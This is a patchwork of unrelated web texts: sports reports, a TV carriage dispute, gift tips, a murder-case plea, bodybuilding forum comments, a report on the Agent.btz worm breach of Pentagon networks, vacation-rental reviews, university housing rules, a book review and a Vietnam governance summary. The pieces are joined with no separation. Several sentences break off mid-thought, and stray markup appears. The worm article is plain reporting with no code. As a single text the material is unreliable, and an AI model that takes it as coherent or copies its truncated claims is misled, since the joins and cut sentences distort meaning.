– Pittsburgh picked up a huge 17-10 win over the Bulls of South Florida. Dion Lewis was solid (105 yards, TD) as the Panthers hold on to first place in the Big East, standing at 6-4 and 4-1 in the conference.

Agreement comes after broadcaster's merger with Young Broadcasting
Dish Network and Media General announced Saturday that they reached an agreement for carriage of the broadcaster’s TV stations in 17 markets across the U.S., which have been dark on the satcaster since Oct. 1.
Terms of the agreement were not disclosed. Deal comes after Media General on Nov. 12 completed the its merger with Young Broadcasting, combining Media General’s 18 stations and Young’s 13 stations, reaching 16.5 million TV households.
According to Dish, in negotiations prior to the blackout, Media General rejected Dish’s offer to match rates paid by primary pay-TV competitors as well as an offer to receive the same rates the satcaster pays to other area broadcasters — and the satellite company filed a formal complaint with the FCC accusing Media General of not negotiating in good faith.
Dish also claimed Media General rejected Dish’s offer of a short-term contract extension until the merger was completed with Young Broadcasting, with which Dish has a long-term agreement in place.
SEE ALSO: Dish Accuses Media General of Bad-Faith Dealing in FCC Complaint
Other recent high-profile retrans spats have included the monthlong CBS and Showtime blackout on Time Warner Cable in August. Feuding over the rising cost of programming also has affected cablers — Turner Broadcasting last month had its first-ever blackout in a contract dispute with The Washington Post. Co.’s Cable One.
The 20 Media General stations covered under the deal.
Separately, Dish is currently negotiating a broad programming deal with Disney, encompassing eight ABC stations, ESPN, Disney Channel and other cablers. That agreement expired Sept. 30; the companies said they reached a short-term extension while work out a new deal.
On Dish’s earnings call this week, chairman Charlie Ergen said “cautiously optimistic” about reaching a long-term deal with Disney for ABC stations and ESPN and other cable channels, although he also reiterated that if the two companies can’t reach a satisfactory deal, he’s willing to walk away.
I live in North Charleston SC, and we still don’t have NBC back. Why?
Thanks To Media General and Dish for bringing back WJTV (CBS) in Jackson, Miss.![if gte IE 8]>

Portland, Oregon: Hoyt Arboretum.Maybe you are lacking ideas on what to buy a friend for his/her birthday or maybe you are excited to start shopping for presents now that the Easter holiday is just around the corner. Regardless of the case, here are five awesome unisex gift ideas that will save you a lot of trouble. They are also more original than the same old gift cards, certifications and baskets. These gifts can be given to anyone regardless of their age or gender. Check them out!
1. Homemade treats
Homemade treats are an excellent gift choice for Easter in particular, since everyone enjoys them. You can opt for freshly baked cookies or homemade chocolates that are simply a gourmet’s delight. If cooking is not your strength, you can always buy some baked goods from confectioneries and bakeries. Just make sure they are fresh and wrapped nicely, for a higher impact.
2. Movie passes
Movie passes are a different story than gift cards. Everyone enjoys going to the movies, but you have to take into consideration their tastes in movies. If you know a movie buff who goes to watch the latest flick in town, then a movie pass to just about any new movie is perfect. For your other friends or family members, you can purchase movie passes to a romantic comedy, an animated movie, or an action flick.
3. Travel items
If you want your gift to be practical and useful for the recipient, then travel items are always a great idea. You can either opt for a travel kit, which includes several items, or give the items separately, if the idea of kits is not appealing to you. Examples of travel items you could opt for include travel pillows, alarm clocks, baggage organizers, eye blinders and so on.
4. Designer pens
Pens are a particularly good idea if you want to give them to someone in your business or professional environment. When entering such an environment, a designer pen can make anyone stand out and create a great impression. Designer pens make perfect unisex gifts, since both men and women use them on a daily basis.
5. Books
Unfortunately, many people nowadays fail to take into consideration the best unisex gift idea ever: books. If you know the preferences of the recipient, personalize your gift and give them a book of the genre they like: romance, fiction, thriller, horror, or even non-fiction. Comic books are also a great choice. You can go for a collection of books, as well.
You cannot go wrong with any of these great unisex gift ideas. Just remember that even though you are opting for a unisex gift, you still need to put a little thought into it, so the recipient knows that you didn’t get them the first thing that popped in the store window.SKOWHEGAN, Maine (NEWS CENTER) -- The suspect in a three decides old murder pleaded not guilty today.
55-year-old Jay Mercier of Industry was charged after a secret indictment was handed up by a grand jury last month. He's accused of killing Rita St. Peter who was 20-years old at the time of her death.
Police are not saying what led them to him, but they do say they had long suspected him in the murder and the time was right to bring the evidence to a grand jury.
The woman's relatives said they never gave up on the case and they're glad police didn't either.
"It's been a long time, but you know don't anybody ever give up hope out there. There's cold cases but don't give up hope, because one day you just never know, just like us we never gave up hope", said Christine Belangia, St. Peter's sister.
Mercier is being held without bail at the Somerset County Jail in Skowhegan. It's likely his trial won't start until late spring or early summer.
NEWS CENTERTraining Frequency for Mass Gains.
Lyle,
I work out Mon, Wed and Sat for weights with Sunday for cardio.
– I should use the “every 5th day” schedule, right?
– I can’t find your “generic bulking routine” in the site, can you point me to it?
Thanks,
JD
Santiago, Chile
Lyle,
I googled and found your routine. Supersets can be used in any of the lower/upper routines?
Thanks,
JD
Regarding your closing paragraphs: I can vouch for myself and others I have worked with that hitting everything every 4th to 5th day seems to be optimal.
I’ve taken guys who have been blasting themselves into the ground, training 6 days a week and spinning their wheels, then put them on a 3 day routine with less volume + higher frequency and you might as well call me Houdini.
Really nice article Lyle
Great article, Lyle. As always, thanks for the insight!
I’ve recently transitioned from a ‘blasting’ workout split to a 3x per week full body circuit… Lots of compound lifts with a few isolation exercises. I’ve experienced noticeable growth over the past 2 weeks, much of which I attribute to ‘newbie’ growth having recently drastically altered my training method.
Would you agree with the above statement, and what are your opinions on the expected rate of tapering off growth based on my changed direction.
PS – I am in a 200-300 caloric deficit eating plan… for what it’s worth.
Lyle,
I recently discovered your site through Martin Berkhan of LeanGains since I am a big supporter of intermittent fasting. I am a nutritional sciences major at the University of Delaware and hope to do research in the coming years, so the scientific approach to every article on this site is what really appealed to me.
With that said, I had recently read your article entitled “Muscle Gain Mistakes” and there you mentioned training a muscle once every 5 days for optimal results and I thought this was interesting since usually people online advocate the once a week style of training. Today I went on your site to reread that article and post a question asking you to explain that frequency more, and I saw this article on your main page! Talk about coincidence.
I do still have a quick question, however. What kind of volume do you think is best for doing two upper body and two lower body workouts a week? And for upper body, how would you split up the exercises in order to achieve this? It seems that working chest, shoulders, triceps, back, and biceps all on one day and then only hitting legs on a lower body day wouldn’t be the same volume or intensity for the days. Either that or legs would be hit really hard in comparison to upper body. What do you think?
Lyle,
Great article….I am curious to know how many reps/sets and all that good jazz would accompany this type of workout. I am finishing up HST (I loved it!) and I am about to start UD2.0., but I am looking for some new training schedule after my cut. Thanks!
Training frequency depends much on intensity and less on volume.
You can’t train body three times per week with 95-100% intensity.
In HST intensity varies from 50-60% to 90-100% at the end of each micro cycle.
In general I see lot of feelings in this article but not real science behind it, sorry
Juan: Yes, for a three day per week program, I’d use the alternating every 5th day approach. I often use alternating supersets in workouts if the gym will allow it.
Jarrod: I’m not exactly sure what you’re asking but, as JC points out, people who move from the blast it once/week thing to higher training frequencies usually start growing better. Nobody can say when you’ll stop seeing progress with it, just keep training and see what happens.
Tim: I’ll address volumes and exercise sequencing in a later article, too much to cover here.
Anatoly: Of course it depends on the intensity and volume of training. But in that there are both minimum volumes and intensities for optimal growth (and these change depending on training status), well…read the article again since I at least touched on both issues. I’ll provide more detail in a future article.
If you want some science though, I’d point you towards the Rhea meta-analyses or the giant Wernbom review on training and protein synthesis. Both of which support what I wrote in the article.
When it is said that protein synthesis can be completed in approx. 48 hours does this include sarcoplasmic factors or does it have it’s own specific time period for recovery?
really appreciate your answer, Lyle.
Thanks.
Guys!
For every detail on Lyle’s generic Bulking routine I found:
Which even has a PDF file with FAQs answered by Lyle posts!
Regards,
JD
Hey Lyle,
What do you think of a 2 on 2 off upper/lower split so you train everything evenly at every 4th day.
So Monday: upper, Tuesday: lower, Wed/Thurs: off, Fri: upper, Sat: lower, Sun/Mon: off.
It requires more freedom in scheduling, but just curious if you thought this type of consistency was somehow advantageous as opposed to the every 3rd/4th day inconsistent recovery…
Thanks.
Hi Lyle,
Another really nice article here. I like your approach and explanations. I do have one question however.
I completely agree with the frequency of hitting bodyparts. But you see some guys only hitting one bodypart per week (Im talking beginners and others who havent done a full body x3 style workout before) yet they get great results. I know these people are probably few and far between but what is your explanation for these kinds of people? Genetics perhaps?
Thanks
Matt
Exceptions to a generality don’t disprove a generality and folks tend to focus on the ‘big guys’ in the gym. Who usually have some benefits that mere mortals lack, usually hormonal. The problem is that if you watch the majority in the gym training the same way, they get no gains.
You can’t ignore the 98% not getting results and focus on the 2% who do (numbers made up for illustration).
And I’m more interested in what will work for the grand majority than for the small minority. And in my experience, that of other coaches who’s opinonss I trust, and the research on the topic, the frequency discussed in this article (somewehre between twice/week to once every 5 days) works better than the lower frequency training.
You often also find that even folks with various advantages (hormonal, drugs, genetics) grow even better with the higher frequency. I know Dante Trudell of Doggcrapp has found that to be the case and I know some drug using pros used Bryan’s HST and grew far better compared to their old style of hit a bodypart once/week training.
Thanks for the (fast) response. I thought this would be the case. Its great hearing form someone of your experience on this subject.
What about a three days on a day off routine ?
The most I have ever grown was when I was doing a every other day routine. Essentially working out 4 times every 8 days. Too bad life gets in the way and scheduling usually gets messed up
For beginners and intermediate I saw best results with whole-body training three non-consecutive days per week(MON-WED-FRI). I think what is theorised by the people from HST is true, in particular for naturals.
As more advanced athlete still focused on hypertrophy you want perhaps a little more of a split for volume. The given examples are good, but I feel a 3-way split give even more benefit and the routines are less exhausting. I split Legs by themselves(Day1) Back, Biceps, Calfes(Day2) Shoulders, Triceps, abdominals(Day3) and train on Mon,Wed, Fri,Sat(Tue, Thu, Sun off). So within a 3-week cycle evrey bodypart(or group of muscles)
is trained on a different weekday.
I think your split sucks.
Elaborate on that please-if you will.
Not much of an arguement there-for me this split works quite well-it is my cycle of more volume-during winter I train either every other day a compact whole body workout which covers the very basic cleans, squats, front squats, deadlifts, rows…and some core work or a MON-WED-FRI as mentioned above splitting up upper and lower body, so everything is worked every 5th day. But the beforementioned split allows for more sets and exercises for one specific bodypart without endless hours in the gym-I am into this for some 22 years-a 6`1 lean 232 lbs. 565lbs. deadlift and a NATURAL so things that you find suck have already produced some results. Best regards.
Phil, given Martin Berkhan’s formula for maximum muscular potential (height in cm – 100 = max weight just about any natural body builder can expect in kg), you’re either 30% body fat (not quite lean) or lying about numbers/being natural. And given Martin himself fits to this rule and has a 600 lb deadlift at 6% body fat, I’d say something is exaggerated in your claim.
Just to make things easier for you, my reference:
Jess. Thanks for your comment. Well, I am not a bodybuilder-and certainly not as lean as a competitive bodybuilder- using a wrist-neck-hip-waist ratio calculator I am in the upper 10`s and I took a look at your reference site-well, it is rather estimation than scientifically proven what is possible to achieve naturally-considering genetics. I have seen some impressive muscular development in people who never trained at all, including family members- the given numbers are real, but again I don`t consider myself a bodybuilder per se.
What are your thoughts about inserting one week of training one muscle group per week between 3 weeks of training a group twice a week? Or doing the same with training a group three times per week?
By doing so, I believe we could “surprise” our muscles and not allow them do adapt to training the same way for too long…
Would you put deadlifts on the upper days or lower days?
Very interesting read. I used to train each muscle once per week, but I’m going to bump that up to twice per week. How does this split look to you folk?
Monday: Back, Biceps, Lats
Tuesday: Chest, Triceps, Abs
Wednesday: Legs, Shoulders, Traps
Thursday: Back, Biceps, Lats
Friday: Chest, Triceps, Abs
Saurday: Legs, Shoulders, Traps
Sunday: Off
So there’s a whole 72 hours between training the same muscles, which should be sufficient rest, right?
what the debate is about is which training frequency would induce more muscle development at the same weight gained? For example two guys gaining 20 pounds, one of them having gained more fat than the other.
First of all, thank you for all the great articles.
As for my own experience, I find three full-body workouts (hard-light-medium) or a four-day split routine (upper-lower) per week (mostly compound movements at 5-8 reps) to be the limit of what my body can stand in the long run. I prefer the three full-body workout option, because it takes less time overall, but even then I have to take care to make the middle day lighter in order to recover in time for the third weekly workout.
I have been lifting for over 20 years now. I have built up alot of size and strength. Was just curious to what you think of training a bodypart per workout. Like chest, shoulders, arms, back, legs…etc…
I train each muscle pretty close to 2x per week, with a very limited number of sets in each workout. I like doing rest pause sets as in DC training. So my set amount per workout per bodypart is 3 sets. sometimes only 2.
I’m in the gym 6x per week. just curious, i know you think the 2x per week per bodypart is optimum, but what about total days in the gym per week or does it matter. I realize, the more your in the gym, the more you have to adjust the volume.
I train one day per week. I squat and deadlift once every two weeks. The stronger you get the more recovery you need. I’ve been training for over 24 years. When I started out I went 3x per week making great gains squatting and deadlifting in the same week. Things started to stall so I cut back to two days per week squat one week deadlift the next. Things started to stall now I train 1x per week deadlifting and squatting once per month. Heavy squats and deadlifts will take it out of you. I lift on Tuesday evenings. You will make great gains if your body isn’t stressed out.
Hi lyle,
Would it be a good idea to do a push pull split….so instead of upper lower a would do a push day including squats and my pull day will include deadlift?
Thanks
If you train with high intensity more than twice a week you risk injury which
will really set you back, I know I did it. Shoulder impingement.
I found that by increasing sets and about 90% intensity about once a week
I am making gains and recovering in time for the next workout.
If you are younger or naturally recover fast maybe twice a week is good
with reasonable intensity.

Hunt Slonem: Stroke of a Genius
Quirky artist Hunt Slonem has opened his first permanent West Coast exhibition in, guess where, San Francisco! 12 Gallagher Lane, located in Gallery Row, is featuring "Flora, Fauna, Faces & Feathers" in the form of Slonem's two Louisiana homes. Shutters and bright colors accentuate the 3,300 square-foot gallery and bring some sense into his outlandish works of art. From portraits of Honest Abe to a gigantic canvas of bunnies (humorously titled "Multiply"), Slonem sounds like a hoot. The 12 Gallagher Lane gallery is open Thursday, Friday, Saturday and Mondayfrom 11 a.m. - 5 p.m., and Sunday from noon - 5 p.m. and by appointment. The gallery is also available for private events.It’s back. The story of the worm that ate the Pentagon just won’t go away.
The attack of the Agent.btz worm, dubbed “the most serious breach of the U.S. military’s classified computer systems,” is getting another telling, this time in the Washington Post. The story adds new details about the intrusion — and reveals that some in the military wanted to use “offensive tools” to remove the malware on overseas and civilian networks. But the article still doesn’t uncover anything that justifies the hyperbole that the government has used for this breach since it was first uncovered.
Danger Room broke the story in November 2008 that the Army got spooked by Agent.btz after it was discovered crawling through the Secret Internet Protocol Router Network, which the Defense and State departments use to transmit classified material, noting at the time that the U.S. Strategic Command had suspended the use of USB drives as well as external hard drives and any other removable media as a result of the worm. The Post story adds that the Joint Worldwide Intelligence Communication System, which carries top-secret information to U.S. officials throughout the world, was also infected.
The Pentagon effort to disinfect systems took 14 months, in an operation dubbed “Buckshot Yankee,” a process that eventually led the armed forces to revamp its information defenses and create a new military unit, U.S. Cyber Command.
Then last year, Deputy Defense Secretary William Lynn upped the quotient when he wrote in Foreign Affairs magazine that the worm was a deliberate attack by a foreign intelligence agency who had placed the worm on a flash drive. Small problem: He didn’t present any evidence to back up his assertion that this was anything more than a run-of-the-mill malware infection.
“That code spread undetected on both classified and unclassified systems, establishing what amounted to a digital beachhead, from which data could be transferred to servers under foreign control,” Lynn wrote. “It was a network administrator’s worst fear: a rogue program operating silently, poised to deliver operational plans into the hands of an unknown adversary.”
Lynn never said if information actually was siphoned from the systems, nor does the Post say that anything was taken. All the Post says is that once on systems, the worm began “beaconing” out to its creator – that is, phoning home in the way that all botnet malware does once it’s on an infected system to receive instructions about what to do next.
The Post says the beacons were first noticed by an analyst in the NSA’s Advanced Networks Operations (ANO) team, a group of young techies housed on the NSA campus, whose job is to hunt for suspicious activity on the government’s secure networks. They then reached out to Richard C. Schaeffer Jr., the NSA’s top computer systems protection officer at the time.
On the afternoon of Friday, Oct. 24, [Schaeffer Jr.]… “We’ve got a problem,” he said.
The “problem” began in October 2008 in Afghanistan where someone appeared to pick up the infection from a cybercafé and passed it to government systems on an infected thumb drive.
“We knew fairly confidently that the mechanism had been somebody going to a kiosk and doing something they shouldn’t have as opposed to somebody who had been able to get inside the network,” one former official told the Post.
The worm spread widely on military computers around the world, especially in Iraq and Afghanistan.
The article goes on to detail the process of neutralizing the malware on infected machines before cleaning out the code. Officials debated whether to use “offensive tools to neutralize the malware on non-military networks,” including infected machines in other countries. Senior officials nixed the idea “on the grounds that Agent.btz appeared to be an act of espionage, not an outright attack, and didn’t justify such an aggressive response.”
A few weeks later, the order went out banning the use of thumb drives, which generated a.”
…The rate of new infections finally subsided in early 2009. Officials say no evidence emerged that Agent.btz succeeded in communicating with a master computer or in putting secret documents in enemy hands.
But that’s not the end of the story. The phantom “attack” on the Pentagon gave NSA Director Alexander the platform to press the case that the new Cyber Command should be able to use the NSA’s capabilities to obtain foreign intelligence to defend the military’s systems. It also renewed discussion among senior officials at the White House and key departments about how to best protect critical infrastructure networks that are in the hands of the private sector.
“Some officials argued that the military was better equipped than the Department of Homeland Security to respond to a major destructive attack on a power grid or other critical system, but others disagreed,” the Post writes.
It also raised questions about how aggressive military commanders could respond to perceived attacks on their computer systems.
“You have the right of self-defense, but you don’t know how far you can carry it and under what circumstances, and in what places,” recently retired vice chairman of the Joint Chief, James E. Cartwright Jr., told the paper. “So for a commander who’s out there in a very ambiguous world looking for guidance, if somebody attacks them, are they supposed to run? Can they respond?”
Stay tuned.

Greene and La Vaque point out, the population treated with a drug is more
diverse than the population in which it was initially studied. Nonetheless,
the most serious ADRs, such as those identified by Lasser et al,1
seem best explained by the much more extensive use after marketing and not
by the greater diversity or comorbidity of the treated population, with some
important exceptions. In premarketing clinical trials, drugs known to interact
with the test drug would be scrupulously avoided; this avoidance is not ensured
once the drug is marketed. In addition, few new drugs are studied in pregnant
women. Of the ADRs identified by Lasser et al leading to box warnings or withdrawal,
few (perhaps suprofen, used in dehydrated patients or some of the QT-prolonging
drugs, used in patients with prolonged QT prior to taking the drug) seem principally

Cascades announced a new investment of $62 million with over 67 new jobs and the transfer of another 60 jobs from its Richmond County location. The company has purchased the entire WestPoint Home property and plans to revitalize and renovate the buildings to meet their needs. This is truly wonderful news for the citizens of Scotland County as Cascades will have much higher than average wages and is a company that treats its employees well.
This announcement brings us to a total of just over $195 million dollars in new investment with an additional 500 jobs announced since 2009. We have been able to announce a new industry expansion or location each year for the past six years. This type of economic development success is unprecedented over the last 30 years and is a considerable achievement due to the amount of competition that exists in today’s world of economic development. It is harder and harder each year for rural counties to bring new investment and jobs through the practice of recruiting companies to locate within the county boundaries. Many counties in our region continue to struggle and it is with good reason. There are approximately 15,000 Economic Development Organizations or EDO’s that are working to attract somewhere around 1,200 projects to locate in their respective regions.
Without the assistance of many partners and a great deal of effort on the part of the Scotland County Board of Commissioners, this Cascades project might not have ended so well for us. We were originally eliminated during the site selection process in late 2013 only to be put back into consideration in January 2014. Until two weeks before the announcement, we were still in competition with another state that wanted the project just as much as we did.
I think that it is important to express appreciation for all partners involved in this project such as the State of North Carolina, Scotland County, the City of Laurinburg, the Scotland County Economic Development Corporation, the Laurinburg Maxton Airport Commission, Richmond Community College, Duke Energy, Piedmont Natural Gas, the Laurinburg/Scotland County Area Chamber of Commerce and several existing industries as Cascades met with different Human Resource Managers in our county. Some of these partners were involved directly as appropriate, while others were in the peripheral as support but just as important in the process as they all help to create an environment for success in our community. Each of those entities listed work daily within their mission to create a better Scotland County. Equally important though is the role each citizen plays in the community as we all work together in order to make Scotland County a community of choice.
Going forward it is necessary for us all to have realistic expectations of success in economic development in Scotland County. There is great reason for hope but it takes all of us working together to Target Laurinburg and Scotland County. That is the only way we will see continued success and opportunities for the citizens of our County.
Greg Icard is director of Economic Development for Scotland County and president of the Scotland County Economic Development Corporation.PHILADELPHIA (AP) — Nagged by injury, Roy Halladay had one of his worst starts at the worst time for the Philadelphia Phillies.
Freddie Freeman hit a three-run homer to back Mike Minor and the Atlanta Braves roughed up Halladay to move closer to clinching a postseason berth with an 8-2 victory over Philadelphia on Saturday.
The Phillies fell four games behind the Cardinals for the NL’s second wild-card spot with only 10 games remaining. The five-time defending NL East champions had won four in a row and 12 of 15 to get in the race.
“We still have a heartbeat, but we’re getting in a tough position,” manager Charlie Manuel said.
Ryan Howard became the second-fastest player to reach 300 homers, but Halladay (10-8) had.
Halladay wasn’t 100 percent.”
Halladay expects to make his next start, and said the injury isn’t a problem long-term.
“It’s definitely not structural,” he said.
The win, coupled with Milwaukee’s 10-4 loss to Washington, reduced Atlanta’s magic number for securing an NL wild-card playoff spot to three. The Braves were up 8½ games through Sept. 5 last year, but went 9-18 down the stretch and were overtaken by St. Louis on the final day of the season.
“I don’t want to hear anything about it,” manager Fredi Gonzalez said with a smile.
Minor (10-10) gave up two runs and two hits in six innings to win his fourth straight decision. The left-hander has a 1.09 ERA in four starts this month.
“It’s just experience and having a better game plan,” he said. “You put things in your memory bank.”.
“The two-out hits were really big,” Jones said. “It was a good job by our hitters to take advantage of mistakes.”.
“He didn’t have a whole lot,” Manuel said. “He had a hard time putting the ball where he wanted it. Just one of those days. Rough.Opera.

- Pokemon Pop ’n Battle Launcher from Jakks Pacific
- Part of the Pokémon brand
- We recommend this product for ages 4 and up
What It Is
What It Is
There's a new way for kids to train and battle to become a Pokémon master. With the Pop 'n Battle Launcher, aim your Pokémon for the target so that the target closes up around the Pokémon character. The Poké Ball Launcher pops open and reveals a one-inch Pokémon figure on a sliding base. Kids then launch this figure into battle toward the target. If a successful attack is launched, the target will snap closed on the figure. The side of the attack target that lands face up then determines the strength and effectiveness of each attack and ties into a larger game play experience. You can get one to four damage points, miss completely, or block the damage inflicted by your opponents. Players can play solo or challenge other Pokémon players to battles.
Why It’s Fun
In Pokémon, battle is everything, and the Pop 'n Battle Launcher offers great skill and action play for young Pokémon battlers. Kids can practice on their own to develop the skill necessary for landing the Pokémon on the target and beating their friends.
Who It’s For
The Pop 'n Battle Launcher is for ages 4 and up. This is definitely for the younger Pokémon fan, but they'll be intrigued by the action and all the play possibilities.
What to Be Aware of
There's a bit of a learning curve involved. Kids aren't going to land their Pokémon on the target every time, but acquiring the skill is an important part of the play.

A vacation is important and we want everyone who comes here to have the best experience possible. Family and friends are valuable and spending quality time with them is the most important thing for us.

We had our wedding here and the experience was absolutely amazing. From the beginning, Marie was incredibly prompt in getting us answers and setting up a site visit. We fell in love immediately and booked Friday - Monday so that we could have everything on the property and also have a place for our wedding party to stay. It turned our wedding into an amazing weekend as opposed to your normal 8 hour event. The property is immaculately kept and the house is HUGE. It was an absolutely perfect experience and I recommend this highly to anyone looking for a wedding venue or vacation rental
We rented the house because of the dirt bike track. The thought that the kids could ride while I was floating in the pool was very alluring. But then we got distracted with the game room, fishing in the lake, floating in the pool, singing karaoke in the theater room, and making s'mores. The property was magnificent! It was well maintained and the kitchen was stocked with every item needed to cook for a large group. But the best feature of the property was Lenny. Lenny was available at all hours to answer our questions and help us work the sound system and the karaoke. Lenny added some awesome to a vacation that was already amazing.
We came as a group of 17 ladies for a girls' weekend. What an incredible property!! There was plenty of room for all of us - everywhere we settled, it felt spacious. The home itself is gorgeous. Every room is updated and well-decorated. The pool is huge and lovely. The addition of the bridge was great for staying away from the hot desert sun. We brought kayaks and stand up paddle boards and everyone got a kick out of testing everything out, having the lake to ourselves. NB: there is a property caretaker that lives on the premises so the property is not completely private.
Thanks to the gracious owners for making sure we were taken care of throughout the weekend. Your home is simply spectacular. We had a wonderful time - we are already talking about planning our next visit!
My fiance, my self and his parents just returned from 3 nights at Desert Ridge. It was just what we needed. The house is beautiful. Decorated with all the nicest things and stocked with everything we needed to cook. We never even left the house (other to go into the pool and jacuzzi). Although is has a big look, it was still really warm and cozy. Thank you, we will be back!!!
I stayed here with frends about a year and a half ago and loved the privacy The fishing in the lake,my own dirt bike track & the pool........WOW!! So we reseved it for New Years 20!2, for our family of 5 and 3 other familys (12adults & 16 kids 14 and under total) and I was blown away. New owners had bought the property and added a huge game room with everthing from pool, to darts, to even a 22' custom shuffle board table. I was also a little worried about it getting a little cramped but the way the house is now and the property with tons of games and activities to do we only left twice the whole weekend....to get food. My family and I will never forget this New Years!!

I rented the Ranch for my wedding October 1st, 2011. I can say that there is NOT a better place for a wedding. I live in San Diego and wanted a destination type wedding but without the airfare. This is the most beautiful property I have ever seen. We rented it for a long weekend so we could enjoy the home for the days before the wedding. (Though there was no relaxing! I need to come back so I can actually dip in the pool!) It is the perfect place for a wedding. The views are breathtaking! the pool is gorgeous and the lake behind makes for the most beautiful photos. All of my guests were beyond impressed with the grounds. It is manicured beautifully. I had 200 guests and there was plenty of space. Lenny, the Ranch hand is the greatest asset to the Ranch. Extremely helpful. The boys had a blast all weekend- jumping bmx bikes into the lake. The guest house was perfect because the boys got ready and hung out in there on the day of the wedding while the girls stayed in the main house. The groom and I were able to avoid seeing one another all day before the ceremony :) My photographers had the best time taking photos in all of the unique spots the Ranch has to offer. It has a rustic type feel too so it perfect for DIY brides like myself. The Ranch is an empty canvas to make all of your wedding visions come true. I would recommend it to any one and everyone else.

This bladder is simple and easy enough to use. I took it on a hike/climb and it performed just as I thought it would. I was a little nervous taking it out anywhere near some of the sharp granite we were hiking on as it seemed pretty thin. Another concern was the opening at the top. It was locked down with a clam that seemed to slip off with the bounce of my pack. Overall I think it's great but may look into something with a tougher skin in the future.

C.General Policies
1.The offer of on-campus accommodations is a privilege and not a right. This document creates a license to use on-campus housing and is not a lease. Occupancy in campus housing implies acceptance by each student of the terms set forth below.
2.The University has the right, using established procedures, to suspend or withdraw accommodations, guest privileges or access to a campus residence to any person(s) for violation of these regulations, for health and safety reasons or for nonpayment of bills. In addition, the University may seek financial or other restitution for loss or damage to residence hall property.
3.The University, through the provisions listed herein, reserves the right to conduct inspections to ensure the health, safety and general welfare of University community members, and/or the physical security of University property.
4.The University reserves the right to enter and inspect residential quarters without advance notice, including individual bedrooms and common areas, on receipt of a complaint of illegal activity or a violation of the University Student Conduct Code. Personnel from the Division of Campus Residences, as well as emergency personnel, may access residential quarters in the event of an emergency (e.g. fire alarms, fires, floods, etc.), to complete maintenance requests, to prevent harm or damage to persons or property, and/or to enforce provisions of the Terms of Occupancy.
5.Upon residency, the student must carry room/suite key(s) and ID/access card at all times and to provide such ID when requested by University staff member.

See: (Appendix A) and
(). In addition, all local, State and Federal laws are in effect for the campus. This set of regulations as written and as applied, is and shall be limited in purpose to ensure an environment which is healthy, safe, and conducive to academic success; and to insure the financial investment in the residence halls. The distribution of this information (by electronic and other means) to residents constitutes official notice of the possible violations and sanctions contained, though not limited to those.
7.Students themselves are responsible for reviewing, understanding and abiding by the University’s regulations, procedures, requirements, and deadlines as described in all official publications. These include the Undergraduate Bulletin (and supplements), Summer Sessions Bulletin, SPD Bulletin, Graduate Bulletin, Health Science Center Bulletin, Student Handbook, and Class Schedules.

Note: Although Stony Brook University does not typically provide on-campus housing for students who enroll at the age of 17 but will not turn 18 years old until after their first year of studies have ended, such applicants may contact the Associate Director of Residential Programs for Administration and Services, at 631-632-6966 or Reside@stonybrook.edu to request special consideration for campus housing. Students under the age of 17 at the time they enroll are not considered for campus housing. See (Appendix K).

3.Any change in eligibility status (i.e. from full-time student to part-time student, from student to non-student status, or from undergraduate to graduate student status) may result in relocation or termination of housing. Residents who terminate enrollment for any reason, including graduation, must vacate their assignment within 72 hours of the date their enrollment terminates.
4.Eligibility criteria for specific housing areas are listed in (Appendix C).
B.Continuing, Changing, and Revoking of Housing Contract

b)Upon occupancy of a room, the resident(s) should make an initial inspection of the premises and furnishings. Within 3 days of occupancy a staff member will email residents their electronic Room Condition Report (E-RCR).

Mick Foley Talks About CM Punk’s WWE Departure, Jericho’s Podcast Expanding
– Former WWE Superstar Chris Jericho announced on Twitter that his “Talk Is Jericho” podcast is expanding to Twice twice a week.
Jericho says the shows will be released every Wednesday and Friday and thanked everybody for making the show such a big success.
– Mick Foley has posted a video on Youtube talking about CM Punk’s decision to leave WWE, his personal experience working with Punk and how he thinks WWE should bring Punk back.he 18th century was an age like no other. Cold blooded and cynical on the one hand and touchingly optimistic on the other, it was a time of social, scientific and political upheaval. The Music of the Spheres, Elizabeth Redfern's first novel, combines the elements of mystery and history to produce a masterful piece of period suspense fiction set against the aftermath of the French Revolution.
When the monarchy toppled in France, no crowned head in Europe rested easy without a network of espionage agents. England was no exception, with its own spies and rumors of foreign agents who infiltrated every walk of life to lay the groundwork for a French invasion.
Redfern's central character is Home Office agent Jonathan Absey, a spy-catcher who had served his country well in hunting down England's enemies. His inside track to promotion and his peace of mind are destroyed by the murder of his 15-year-old daughter, Ellie; catching her killer becomes his reason for living. Jonathan loses his balance on the tightrope between personal and professional duty when a series of murders of red-haired young women, so painfully reminiscent of his daughter, point not only to French spies but to a sadistic killer in their midst. In order to solve the mystery of his daughter's death, Jonathan must track down the murderer of the other girls. The trail leads him to a group of French expatriates and their British friends, amateur astronomers who hide their personal demons behind a faÂade of scientific fascination with the mysteries of the solar system. Jonathan's intuition tells him that this seemingly harmless group of stargazers conceals spies, possibly traitors, and almost assuredly, a psychotic killer.
Like Patrick Suskind's Perfume and David Liss' A Conspiracy of Paper, this intensely atmospheric historical suspense novel is alive with the sights and sounds of the day. The author's years of research allow her to draw on a wealth of period detail from 18th century medicine, mathematics, astronomy and the British government's secret intelligence network, including the science of encryption. Solidly grounded in the history of a perilous time, the novel's imagery and characterization bring 18th century London to life with its contrasts of wealth and squalor, poverty and power, and people it with a compelling cast of finely drawn characters acting out an intricate and powerful human drama.

Executive Summary
Vietnam is a one-party state, with power vested in the Communist Party (VCP) and some dialogue taking place within the legislative National Assembly (NA). The main institutional structures of political power and governance have evolved since 1976. Government policy is set by the politburo, the VCP’s executive body, but the National Assembly has had a growing influence in this process. In June 2010, for the first time in its history, the NA opposed a major government spending initiative, blocking an ambitious high speed rail project. The 11th Party Congress of the VCP, which took place in January 2011, confirmed the existing structures of political rule. The delegates pledged to maintain one-party rule and continue Vietnam’s market-led policies. While the congress paved the way for some leadership changes and made several important policy announcements, delegates reaffirmed the uncontested dominance of the VCP. Corruption and abuse of office remain one of the VCP’s most serious problems in terms of legitimacy. Between December 2008 and November 2009, 289 corruption cases were prosecuted, an increase of 2.48% year-on-year. However, the problem is pervasive, and in December 2010, Vietnam’s foreign donors complained about the country’s lack of progress in terms of fighting corruption. The government has continued to clamp down on oppositional civil society actors in an attempt to retain its monopoly on power. At the same time, to respect accorded to religious freedom and practice improved during the assessment period. Human rights, however, remain a thorn in the side of Vietnam’s otherwise smooth international relations. In the wake of the global financial crisis, Vietnam’s inflation rate steadily increased in 2010, reaching 11.75% year-on-year in December. This exacerbated a crisis of confidence in the dong, which already had been affected by a series of devaluations. The government has come under growing international pressure to move away from its growth-oriented economic model and do more to tackle inflation. By 2010, Vietnam had achieved five out of eight millennium development goals (MDGs) 